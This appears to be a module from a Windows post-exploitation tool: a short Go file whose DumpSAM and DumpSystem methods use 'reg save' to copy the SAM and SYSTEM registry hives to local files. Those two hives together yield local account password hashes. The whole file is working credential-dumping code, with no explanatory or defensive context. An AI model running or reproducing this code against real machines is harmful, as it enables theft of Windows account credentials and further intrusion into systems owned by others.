package windows

import (
"os/exec"
)

type SAM struct{}

func NewSAM() *SAM {
return &SAM{}
}

func (s *SAM) DumpSAM() error {
cmd := exec.Command("reg", "save", "HKLM\\SAM", "sam.hive")
return cmd.Run()
}

func (s *SAM) DumpSystem() error {
cmd := exec.Command("reg", "save", "HKLM\\SYSTEM", "system.hive")
return cmd.Run()
}
